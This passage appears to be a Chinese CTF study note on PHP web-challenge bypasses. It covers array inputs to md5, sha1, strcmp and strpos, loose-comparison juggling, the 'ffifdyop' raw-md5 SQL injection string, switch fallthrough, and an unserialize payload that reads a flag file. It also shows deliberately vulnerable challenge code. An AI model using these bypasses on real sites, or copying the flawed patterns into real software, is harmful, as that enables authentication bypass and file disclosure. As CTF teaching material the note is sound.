<span class="pl-s1"><span class="pl-k">&amp;&amp;</span> <span class="pl-c1">md5</span>(<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>s1<span class="pl-pds">'</span></span>]) <span class="pl-k">==</span> <span class="pl-c1">md5</span>(<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>s2<span class="pl-pds">'</span></span>])) {</span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>success, flag:<span class="pl-pds">"</span></span> <span class="pl-k">.</span> <span class="pl-c1">FLAG</span>;</span>
<span class="pl-s1">}</span></pre></div>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>#这里没有弱类型，但可以让$r查出来是Null，然后提交md5里放数组得Null，于是Null===Null</span></span>
<span class="pl-s1"><span class="pl-smi">$name</span> <span class="pl-k">=</span> <span class="pl-c1">addslashes</span>(<span class="pl-smi">$_POST</span>[<span class="pl-s"><span class="pl-pds">'</span>name<span class="pl-pds">'</span></span>]);</span>
<span class="pl-s1"><span class="pl-smi">$r</span> <span class="pl-k">=</span> <span class="pl-smi">$db</span><span class="pl-k">-&gt;</span>get_row(<span class="pl-s"><span class="pl-pds">"</span><span class="pl-s1"><span class="pl-k">SELECT</span> <span class="pl-s">`pass`</span> <span class="pl-k">FROM</span> <span class="pl-s">`user`</span> <span class="pl-k">WHERE</span> <span class="pl-s">`name`</span><span class="pl-k">=</span><span class="pl-s">'{<span class="pl-smi">$name</span>}'</span></span><span class="pl-pds">"</span></span>);</span>
<span class="pl-s1"><span class="pl-k">if</span> (<span class="pl-smi">$r</span>[<span class="pl-s"><span class="pl-pds">'</span>pass<span class="pl-pds">'</span></span>] <span class="pl-k">===</span> <span class="pl-c1">md5</span>(<span class="pl-smi">$_POST</span>[<span class="pl-s"><span class="pl-pds">'</span>pass<span class="pl-pds">'</span></span>])) {</span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>success<span class="pl-pds">"</span></span>;</span>
<span class="pl-s1">}</span></pre></div>
<h3>
<a id="user-content-json传数据key0" class="anchor" href="#json%E4%BC%A0%E6%95%B0%E6%8D%AEkey0" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>json传数据{"key":0}</h3>
<p>PHP将POST的数据全部保存为字符串形式，也就没有办法注入数字类型的数据了而JSON则不一样，JSON本身是一个完整的字符串，经过解析之后可能有字符串，数字，布尔等多种类型。</p>
<pre><code>application/x-www-form-urlencoded
multipart/form-data
application/json
application/xml
</code></pre>
<p>第一个application/x-www-form-urlencoded，是一般表单形式提交的content-type第二个，是包含文件的表单。第三，四个，分别是json和xml，一般是js当中上传的.</p>
<p>{"key":"0"}</p>
<p>这是一个字符串0，我们需要让他为数字类型，用burp拦截，把两个双引号去掉，变成这样：</p>
<p>{"key":0}</p>
<h3>
<a id="user-content-strcmp漏洞1返回0" class="anchor" href="#strcmp%E6%BC%8F%E6%B4%9E1%E8%BF%94%E5%9B%9E0" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>strcmp漏洞1：返回0</h3>
<p>适用与5.3之前版本的php</p>
<p><code>int strcmp ( string $str1 , string $str2 )</code>
// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。
当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0,所以可以故意让其报错，则返回0，则相等了。</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>#flag[]=admin</span></span>
<span class="pl-s1"><span class="pl-c1">define</span>(<span class="pl-s"><span class="pl-pds">'</span>FLAG<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>pwnhub{THIS_IS_FLAG}<span class="pl-pds">'</span></span>);</span>
<span class="pl-s1"><span class="pl-k">if</span> (<span class="pl-c1">strcmp</span>(<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>flag<span class="pl-pds">'</span></span>], <span class="pl-c1">FLAG</span>) <span class="pl-k">==</span> <span class="pl-c1">0</span>) {</span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>success, flag:<span class="pl-pds">"</span></span> <span class="pl-k">.</span> <span class="pl-c1">FLAG</span>;</span>
<span class="pl-s1">}</span></pre></div>
<h3>
<a id="user-content-strcmp漏洞2返回null" class="anchor" href="#strcmp%E6%BC%8F%E6%B4%9E2%E8%BF%94%E5%9B%9Enull" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>strcmp漏洞2：返回Null</h3>
<p>修复了上面1的返回0的漏洞，即大于5.3版本后，变成返回NULL。
array和string进行strcmp比较的时候会返回一个null，因为strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL。
<code>strcmp($c[1],$d)</code></p>
<h3>
<a id="user-content-strcmp漏洞3-判断使用的是-" class="anchor" href="#strcmp%E6%BC%8F%E6%B4%9E3-%E5%88%A4%E6%96%AD%E4%BD%BF%E7%94%A8%E7%9A%84%E6%98%AF-" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>strcmp漏洞3: 判断使用的是 ==</h3>
<p>而判断使用的是==，当NULL==0是 bool(true)</p>
<h3>
<a id="user-content-in_arrayarray_search-弱类型比较" class="anchor" href="#in_arrayarray_search-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>in_array，array_search 弱类型比较</h3>
<p>松散比较下，任何string都等于true：</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span> in_array('a', [true, 'b', 'c'])       // 返回bool(true)，相当于数组里面有字符'a'</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span> array_search('a', [true, 'b', 'c'])   // 返回int(0)，相当于找到了字符'a'</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span> array_search 会使用'ctf'和array中的每个值作比较，这里的比较也是弱比较，所以intval('ctf')==0.</span></span>
<span class="pl-s1"><span class="pl-k">if</span>(<span class="pl-c1">is_array</span>(<span class="pl-k">@</span><span class="pl-smi">$a</span>[<span class="pl-s"><span class="pl-pds">"</span>a2<span class="pl-pds">"</span></span>])){</span>
<span class="pl-s1">        <span class="pl-k">if</span>(<span class="pl-c1">count</span>(<span class="pl-smi">$a</span>[<span class="pl-s"><span class="pl-pds">"</span>a2<span class="pl-pds">"</span></span>])<span class="pl-k">!</span><span class="pl-k">==</span><span class="pl-c1">5</span> <span class="pl-k">OR</span> <span class="pl-k">!</span><span class="pl-c1">is_array</span>(<span class="pl-smi">$a</span>[<span class="pl-s"><span class="pl-pds">"</span>a2<span class="pl-pds">"</span></span>][<span class="pl-c1">0</span>])) <span class="pl-k">die</span>(<span class="pl-s"><span class="pl-pds">"</span>nope<span class="pl-pds">"</span></span>);</span>
<span class="pl-s1">        <span class="pl-smi">$pos</span> <span class="pl-k">=</span> <span class="pl-c1">array_search</span>(<span class="pl-s"><span class="pl-pds">"</span>ctf<span class="pl-pds">"</span></span>, <span class="pl-smi">$a</span>[<span class="pl-s"><span class="pl-pds">"</span>a2<span class="pl-pds">"</span></span>]);</span>
<span class="pl-s1">        <span class="pl-smi">$pos</span><span class="pl-k">===</span><span class="pl-c1">false</span>?<span class="pl-k">die</span>(<span class="pl-s"><span class="pl-pds">"</span>nope<span class="pl-pds">"</span></span>):<span class="pl-c1">NULL</span>;</span>
<span class="pl-s1">        <span class="pl-k">foreach</span>(<span class="pl-smi">$a</span>[<span class="pl-s"><span class="pl-pds">"</span>a2<span class="pl-pds">"</span></span>] <span class="pl-k">as</span> <span class="pl-smi">$key</span><span class="pl-k">=&gt;</span><span class="pl-smi">$val</span>){</span>
<span class="pl-s1">            <span class="pl-smi">$val</span><span class="pl-k">===</span><span class="pl-s"><span class="pl-pds">"</span>ctf<span class="pl-pds">"</span></span>?<span class="pl-k">die</span>(<span class="pl-s"><span class="pl-pds">"</span>nope<span class="pl-pds">"</span></span>):<span class="pl-c1">NULL</span>;</span>
<span class="pl-s1">        }</span>
<span class="pl-s1">        <span class="pl-smi">$v2</span><span class="pl-k">=</span><span class="pl-c1">1</span>;</span>
<span class="pl-s1">}</span></pre></div>
<h3>
<a id="user-content-sha1-md5-报错相等绕过false--false" class="anchor" href="#sha1-md5-%E6%8A%A5%E9%94%99%E7%9B%B8%E7%AD%89%E7%BB%95%E8%BF%87false--false" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>sha1() md5() 报错相等绕过（False === False）</h3>
<p>sha1()函数默认的传入参数类型是字符串型，给它传入数组会出现错误，使sha1()函数返回错误，也就是返回false
md5()函数如果成功则返回已计算的 MD5 散列，如果失败则返回 FALSE。可通过传入数组，返回错误。</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>#?name[]=1&amp;password[]=2</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># === 两边都是false则成立</span></span>
<span class="pl-s1"><span class="pl-k">if</span> (<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>name<span class="pl-pds">'</span></span>] <span class="pl-k">==</span> <span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>password<span class="pl-pds">'</span></span>])</span>
<span class="pl-s1">    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>&lt;p&gt;Your password can not be your name!&lt;/p&gt;<span class="pl-pds">'</span></span>;</span>
<span class="pl-s1"><span class="pl-k">else</span> <span class="pl-k">if</span> (<span class="pl-c1">sha1</span>(<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>name<span class="pl-pds">'</span></span>]) <span class="pl-k">===</span> <span class="pl-c1">sha1</span>(<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>password<span class="pl-pds">'</span></span>]))</span>
<span class="pl-s1">    <span class="pl-k">die</span>(<span class="pl-s"><span class="pl-pds">'</span>Flag: <span class="pl-pds">'</span></span><span class="pl-k">.</span><span class="pl-smi">$flag</span>);</span></pre></div>
<h3>
<a id="user-content-strpos数组nullnull--false" class="anchor" href="#strpos%E6%95%B0%E7%BB%84nullnull--false" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>strpos数组NULL(Null !== False)</h3>
<p>strpos()输入数组出错返回null</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.</span></span>
<span class="pl-s1"><span class="pl-k">&lt;</span>?<span class="pl-c1">php</span></span>
<span class="pl-s1"><span class="pl-smi">$flag</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">"</span>flag<span class="pl-pds">"</span></span>;</span>
<span class="pl-s1">    <span class="pl-k">if</span> (<span class="pl-c1">isset</span> (<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>nctf<span class="pl-pds">'</span></span>])) {</span>
<span class="pl-s1">        <span class="pl-k">if</span> (<span class="pl-k">@</span><span class="pl-c1">ereg</span> (<span class="pl-s"><span class="pl-pds">"</span>^[1-9]+$<span class="pl-pds">"</span></span>, <span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>nctf<span class="pl-pds">'</span></span>]) <span class="pl-k">===</span> <span class="pl-c1">FALSE</span>) <span class="pl-c"><span class="pl-c">#</span> %00截断</span></span>
<span class="pl-s1">            <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>必须输入数字才行<span class="pl-pds">'</span></span>;</span>
<span class="pl-s1">        <span class="pl-k">else</span> <span class="pl-k">if</span> (<span class="pl-c1">strpos</span> (<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>nctf<span class="pl-pds">'</span></span>], <span class="pl-s"><span class="pl-pds">'</span>#biubiubiu<span class="pl-pds">'</span></span>) <span class="pl-k">!</span><span class="pl-k">==</span> <span class="pl-c1">FALSE</span>)   </span>
<span class="pl-s1">            <span class="pl-k">die</span>(<span class="pl-s"><span class="pl-pds">'</span>Flag: <span class="pl-pds">'</span></span><span class="pl-k">.</span><span class="pl-smi">$flag</span>);</span>
<span class="pl-s1">        <span class="pl-k">else</span></span>
<span class="pl-s1">            <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>骚年，继续努力吧啊~<span class="pl-pds">'</span></span>;</span>
<span class="pl-s1">    }</span></pre></div>
<h3>
<a id="user-content-十六进制与十进制比较" class="anchor" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E4%B8%8E%E5%8D%81%E8%BF%9B%E5%88%B6%E6%AF%94%E8%BE%83" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>十六进制与十进制比较</h3>
<p>== 两边的十六进制与十进制比较，是可以相等的。</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>?password=0xdeadc0de</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>echo  dechex ( 3735929054 ); // 将3735929054转为16进制结果为：deadc0de</span></span>
<span class="pl-s1"><span class="pl-k">&lt;</span>?<span class="pl-c1">php</span></span>
<span class="pl-s1"><span class="pl-c1">error_reporting</span>(<span class="pl-c1">0</span>);</span>
<span class="pl-s1"><span class="pl-k">function</span> <span class="pl-en">noother_says_correct</span>(<span class="pl-smi">$temp</span>)</span>
<span class="pl-s1">{</span>
<span class="pl-s1">    <span class="pl-smi">$flag</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>flag{test}<span class="pl-pds">'</span></span>;</span>
<span class="pl-s1">    <span class="pl-smi">$one</span> <span class="pl-k">=</span> <span class="pl-c1">ord</span>(<span class="pl-s"><span class="pl-pds">'</span>1<span class="pl-pds">'</span></span>);  <span class="pl-c"><span class="pl-c">//</span>ord — 返回字符的 ASCII 码值</span></span>
<span class="pl-s1">    <span class="pl-smi">$nine</span> <span class="pl-k">=</span> <span class="pl-c1">ord</span>(<span class="pl-s"><span class="pl-pds">'</span>9<span class="pl-pds">'</span></span>); <span class="pl-c"><span class="pl-c">//</span>ord — 返回字符的 ASCII 码值</span></span>
<span class="pl-s1">    <span class="pl-smi">$number</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>3735929054<span class="pl-pds">'</span></span>;</span>
<span class="pl-s1">    <span class="pl-c"><span class="pl-c">//</span> Check all the input characters!</span></span>
<span class="pl-s1">    <span class="pl-k">for</span> (<span class="pl-smi">$i</span> <span class="pl-k">=</span> <span class="pl-c1">0</span>; <span class="pl-smi">$i</span> <span class="pl-k">&lt;</span> <span class="pl-c1">strlen</span>(<span class="pl-smi">$number</span>); <span class="pl-smi">$i</span><span class="pl-k">++</span>)</span>
<span class="pl-s1">    { </span>
<span class="pl-s1">        <span class="pl-c"><span class="pl-c">//</span> Disallow all the digits!</span></span>
<span class="pl-s1">        <span class="pl-smi">$digit</span> <span class="pl-k">=</span> <span class="pl-c1">ord</span>(<span class="pl-smi">$temp</span>{<span class="pl-smi">$i</span>});</span>
<span class="pl-s1">        <span class="pl-k">if</span> ( (<span class="pl-smi">$digit</span> <span class="pl-k">&gt;=</span> <span class="pl-smi">$one</span>) <span class="pl-k">&amp;&amp;</span> (<span class="pl-smi">$digit</span> <span class="pl-k">&lt;=</span> <span class="pl-smi">$nine</span>) ) <span class="pl-c"><span class="pl-c">#</span># 1到9不允许，但0允许</span></span>
<span class="pl-s1">        {</span>
<span class="pl-s1">            <span class="pl-c"><span class="pl-c">//</span> Aha, digit not allowed!</span></span>
<span class="pl-s1">            <span class="pl-k">return</span> <span class="pl-s"><span class="pl-pds">"</span>flase<span class="pl-pds">"</span></span>;</span>
<span class="pl-s1">        }</span>
<span class="pl-s1">    }</span>
<span class="pl-s1">    <span class="pl-k">if</span>(<span class="pl-smi">$number</span> <span class="pl-k">==</span> <span class="pl-smi">$temp</span>) <span class="pl-c"><span class="pl-c">#</span> </span></span>
<span class="pl-s1">        <span class="pl-k">return</span> <span class="pl-smi">$flag</span>;</span>
<span class="pl-s1">}</span>
<span class="pl-s1"><span class="pl-smi">$temp</span> <span class="pl-k">=</span> <span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>password<span class="pl-pds">'</span></span>];</span>
<span class="pl-s1"><span class="pl-c1">echo</span> noother_says_correct(<span class="pl-smi">$temp</span>);</span></pre></div>
<h2>
<a id="user-content-md5注入带入or" class="anchor" href="#md5%E6%B3%A8%E5%85%A5%E5%B8%A6%E5%85%A5or" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>md5注入带入’or’</h2>
<p>原理：</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c1">md5</span>(<span class="pl-k">string</span>,<span class="pl-c1">raw</span>)</span>
<span class="pl-s1"><span class="pl-c1">raw</span>	可选。规定十六进制或二进制输出格式：</span>
<span class="pl-s1">    <span class="pl-c1">TRUE</span> <span class="pl-k">-</span> 原始 <span class="pl-c1">16</span> 字符二进制格式</span>
<span class="pl-s1">    <span class="pl-c1">FALSE</span> <span class="pl-k">-</span> 默认。<span class="pl-c1">32</span> 字符十六进制数</span></pre></div>
<p>当md5函数的第二个参数为True时，编码将以16进制返回，再转换为字符串。而字符串’ffifdyop’的md5加密结果为<code>'or'&lt;trash&gt;</code> 其中 trash为垃圾值，or一个非0值为真，也就绕过了检测。</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># 执行顺序:字符串：ffifdyop -&gt; md5()加密成276f722736c95d99e921722cf9ed621c-&gt;md5(,true)将16进制转成字符串`'or'&lt;trash&gt;`-&gt;sql执行`'or'&lt;trash&gt;`造成注入</span></span>
<span class="pl-s1"><span class="pl-smi">$sql</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-s1"><span class="pl-k">SELECT</span> <span class="pl-k">*</span> <span class="pl-k">FROM</span> admin <span class="pl-k">WHERE</span> username <span class="pl-k">=</span> admin pass <span class="pl-k">=</span> <span class="pl-s">'</span></span><span class="pl-pds">"</span></span><span class="pl-k">.</span><span class="pl-c1">md5</span>(<span class="pl-smi">$password</span>,<span class="pl-c1">true</span>)<span class="pl-k">.</span><span class="pl-s"><span class="pl-pds">"</span>'<span class="pl-pds">"</span></span>;</span></pre></div>
<h2>
<a id="user-content-switch没有break" class="anchor" href="#switch%E6%B2%A1%E6%9C%89break" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>switch没有break</h2>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>这里case 0 和 1 没有break,使得程序继续往下执行。</span></span>
<span class="pl-s1"><span class="pl-k">&lt;</span>?<span class="pl-c1">php</span></span>
<span class="pl-s1"><span class="pl-c1">error_reporting</span>(<span class="pl-c1">0</span>);</span>
<span class="pl-s1"><span class="pl-k">if</span> (<span class="pl-c1">isset</span>(<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>which<span class="pl-pds">'</span></span>]))</span>
<span class="pl-s1">{</span>
<span class="pl-s1">    <span class="pl-smi">$which</span> <span class="pl-k">=</span> <span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>which<span class="pl-pds">'</span></span>];</span>
<span class="pl-s1">    <span class="pl-k">switch</span> (<span class="pl-smi">$which</span>)</span>
<span class="pl-s1">    {</span>
<span class="pl-s1">    <span class="pl-k">case</span> <span class="pl-c1">0</span>:</span>
<span class="pl-s1">    <span class="pl-k">case</span> <span class="pl-c1">1</span>:</span>
<span class="pl-s1">    <span class="pl-k">case</span> <span class="pl-c1">2</span>:</span>
<span class="pl-s1">        <span class="pl-k">require_once</span> <span class="pl-smi">$which</span><span class="pl-k">.</span><span class="pl-s"><span class="pl-pds">'</span>.php<span class="pl-pds">'</span></span>;</span>
<span class="pl-s1">         <span class="pl-c1">echo</span> <span class="pl-smi">$flag</span>;</span>
<span class="pl-s1">        <span class="pl-k">break</span>;</span>
<span class="pl-s1">    <span class="pl-k">default</span>:</span>
<span class="pl-s1">        <span class="pl-c1">echo</span> <span class="pl-c1">GWF_HTML</span><span class="pl-k">::</span>error(<span class="pl-s"><span class="pl-pds">'</span>PHP-0817<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>Hacker NoNoNo!<span class="pl-pds">'</span></span>, <span class="pl-c1">false</span>);</span>
<span class="pl-s1">        <span class="pl-k">break</span>;</span>
<span class="pl-s1">    }</span>
<span class="pl-s1">}</span></pre></div>
<h2>
<a id="user-content-反序列化" class="anchor" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>反序列化</h2>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-k">&lt;</span><span class="pl-k">!</span><span class="pl-k">--</span> <span class="pl-c1">index</span><span class="pl-k">.</span><span class="pl-c1">php</span> <span class="pl-k">--</span><span class="pl-k">&gt;</span></span>
<span class="pl-s1"><span class="pl-k">&lt;</span>?<span class="pl-c1">php</span> </span>
<span class="pl-s1">	<span class="pl-k">require_once</span>(<span class="pl-s"><span class="pl-pds">'</span>shield.php<span class="pl-pds">'</span></span>);</span>
<span class="pl-s1">	<span class="pl-smi">$x</span> <span class="pl-k">=</span> <span class="pl-k">new</span> <span class="pl-c1">Shield</span>();</span>
<span class="pl-s1">	<span class="pl-c1">isset</span>(<span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>class<span class="pl-pds">'</span></span>]) <span class="pl-k">&amp;&amp;</span> <span class="pl-smi">$g</span> <span class="pl-k">=</span> <span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>class<span class="pl-pds">'</span></span>];</span>
<span class="pl-s1">	<span class="pl-k">if</span> (<span class="pl-k">!</span><span class="pl-c1">empty</span>(<span class="pl-smi">$g</span>)) {</span>
<span class="pl-s1">		<span class="pl-smi">$x</span> <span class="pl-k">=</span> <span class="pl-c1">unserialize</span>(<span class="pl-smi">$g</span>);</span>
<span class="pl-s1">	}</span>
<span class="pl-s1">	<span class="pl-c1">echo</span> <span class="pl-smi">$x</span><span class="pl-k">-&gt;</span>readfile();</span>
<span class="pl-s1"></span><span class="pl-pse"><span class="pl-s1">?</span>&gt;</span>
&lt;<span class="pl-ent">img</span> <span class="pl-e">src</span>=<span class="pl-s"><span class="pl-pds">"</span>showimg.php?img=c2hpZWxkLmpwZw==<span class="pl-pds">"</span></span> <span class="pl-e">width</span>=<span class="pl-s"><span class="pl-pds">"</span>100%<span class="pl-pds">"</span></span>/&gt;
<span class="pl-c"><span class="pl-c">&lt;!--</span> shield.php <span class="pl-c">--&gt;</span></span>
<span class="pl-pse">&lt;?php</span><span class="pl-s1"></span>
<span class="pl-s1">	<span class="pl-c"><span class="pl-c">//</span>flag is in pctf.php</span></span>
<span class="pl-s1">	<span class="pl-k">class</span> <span class="pl-en">Shield</span> {</span>
<span class="pl-s1">		<span class="pl-k">public</span> <span class="pl-smi">$file</span>;</span>
<span class="pl-s1">		<span class="pl-k">function</span> <span class="pl-c1">__construct</span>(<span class="pl-smi">$filename</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>) {</span>
<span class="pl-s1">			<span class="pl-smi">$this</span> <span class="pl-k">-&gt;</span> <span class="pl-c1">file</span> <span class="pl-k">=</span> <span class="pl-smi">$filename</span>;</span>
<span class="pl-s1">		}</span>
<span class="pl-s1">		</span>
<span class="pl-s1">		<span class="pl-k">function</span> <span class="pl-en">readfile</span>() {</span>
<span class="pl-s1">			<span class="pl-k">if</span> (<span class="pl-k">!</span><span class="pl-c1">empty</span>(<span class="pl-smi">$this</span><span class="pl-k">-&gt;</span><span class="pl-smi">file</span>) <span class="pl-k">&amp;&amp;</span> <span class="pl-c1">stripos</span>(<span class="pl-smi">$this</span><span class="pl-k">-&gt;</span><span class="pl-smi">file</span>,<span class="pl-s"><span class="pl-pds">'</span>..<span class="pl-pds">'</span></span>)<span class="pl-k">===</span><span class="pl-c1">FALSE</span>  </span>
<span class="pl-s1">			<span class="pl-k">&amp;&amp;</span> <span class="pl-c1">stripos</span>(<span class="pl-smi">$this</span><span class="pl-k">-&gt;</span><span class="pl-smi">file</span>,<span class="pl-s"><span class="pl-pds">'</span>/<span class="pl-pds">'</span></span>)<span class="pl-k">===</span><span class="pl-c1">FALSE</span> <span class="pl-k">&amp;&amp;</span> <span class="pl-c1">stripos</span>(<span class="pl-smi">$this</span><span class="pl-k">-&gt;</span><span class="pl-smi">file</span>,<span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\\</span><span class="pl-pds">'</span></span>)<span class="pl-k">==</span><span class="pl-c1">FALSE</span>) {</span>
<span class="pl-s1">				<span class="pl-k">return</span> <span class="pl-k">@</span><span class="pl-c1">file_get_contents</span>(<span class="pl-smi">$this</span><span class="pl-k">-&gt;</span><span class="pl-smi">file</span>);</span>
<span class="pl-s1">			}</span>
<span class="pl-s1">		}</span>
<span class="pl-s1">	}</span>
<span class="pl-s1"></span><span class="pl-pse"><span class="pl-s1">?</span>&gt;</span>
<span class="pl-c"><span class="pl-c">&lt;!--</span> showimg.php <span class="pl-c">--&gt;</span></span>
<span class="pl-pse">&lt;?php</span><span class="pl-s1"></span>
<span class="pl-s1">	<span class="pl-smi">$f</span> <span class="pl-k">=</span> <span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>img<span class="pl-pds">'</span></span>];</span>
<span class="pl-s1">	<span class="pl-k">if</span> (<span class="pl-k">!</span><span class="pl-c1">empty</span>(<span class="pl-smi">$f</span>)) {</span>
<span class="pl-s1">		<span class="pl-smi">$f</span> <span class="pl-k">=</span> <span class="pl-c1">base64_decode</span>(<span class="pl-smi">$f</span>);</span>
<span class="pl-s1">		<span class="pl-k">if</span> (<span class="pl-c1">stripos</span>(<span class="pl-smi">$f</span>,<span class="pl-s"><span class="pl-pds">'</span>..<span class="pl-pds">'</span></span>)<span class="pl-k">===</span><span class="pl-c1">FALSE</span> <span class="pl-k">&amp;&amp;</span> <span class="pl-c1">stripos</span>(<span class="pl-smi">$f</span>,<span class="pl-s"><span class="pl-pds">'</span>/<span class="pl-pds">'</span></span>)<span class="pl-k">===</span><span class="pl-c1">FALSE</span> <span class="pl-k">&amp;&amp;</span> <span class="pl-c1">stripos</span>(<span class="pl-smi">$f</span>,<span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\\</span><span class="pl-pds">'</span></span>)<span class="pl-k">===</span><span class="pl-c1">FALSE</span></span>
<span class="pl-s1">		<span class="pl-c"><span class="pl-c">//</span>stripos — 查找字符串首次出现的位置（不区分大小写）</span></span>
<span class="pl-s1">		<span class="pl-k">&amp;&amp;</span> <span class="pl-c1">stripos</span>(<span class="pl-smi">$f</span>,<span class="pl-s"><span class="pl-pds">'</span>pctf<span class="pl-pds">'</span></span>)<span class="pl-k">===</span><span class="pl-c1">FALSE</span>) {</span>
<span class="pl-s1">			<span class="pl-c1">readfile</span>(<span class="pl-smi">$f</span>);</span>
<span class="pl-s1">		} <span class="pl-k">else</span> {</span>
<span class="pl-s1">			<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>File not found!<span class="pl-pds">"</span></span>;</span>
<span class="pl-s1">		}</span>
<span class="pl-s1">	}</span>
<span class="pl-s1"></span><span class="pl-pse"><span class="pl-s1">?</span>&gt;</span></pre></div>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>?class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}</span></span>
<span class="pl-s1"><span class="pl-k">&lt;</span><span class="pl-k">!</span><span class="pl-k">--</span> <span class="pl-c1">answer</span><span class="pl-k">.</span><span class="pl-c1">php</span> <span class="pl-k">--</span><span class="pl-k">&gt;</span></span>
<span class="pl-s1"><span class="pl-k">&lt;</span>?<span class="pl-c1">php</span></span>
<span class="pl-s1"></span>
<span class="pl-s1"><span class="pl-k">require_once</span>(<span class="pl-s"><span class="pl-pds">'</span>shield.php<span class="pl-pds">'</span></span>);</span>
<span class="pl-s1"><span class="pl-smi">$x</span> <span class="pl-k">=</span> <span class="pl-k">class</span> Shield();</span>
<span class="pl-s1"><span class="pl-smi">$g</span> <span class="pl-k">=</span> <span class="pl-c1">serialize</span>(<span class="pl-smi">$x</span>);</span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-smi">$g</span>;</span>
<span class="pl-s1"></span>
<span class="pl-s1"></span><span class="pl-pse"><span class="pl-s1">?</span>&gt;</span>

<span class="pl-c"><span class="pl-c">&lt;!--</span> shield.php <span class="pl-c">--&gt;</span></span>
<span class="pl-pse">&lt;?php</span><span class="pl-s1"></span>
<span class="pl-s1">    <span class="pl-c"><span class="pl-c">//</span>flag is in pctf.php</span></span>
<span class="pl-s1">    <span class="pl-k">class</span> <span class="pl-en">Shield</span> {</span>
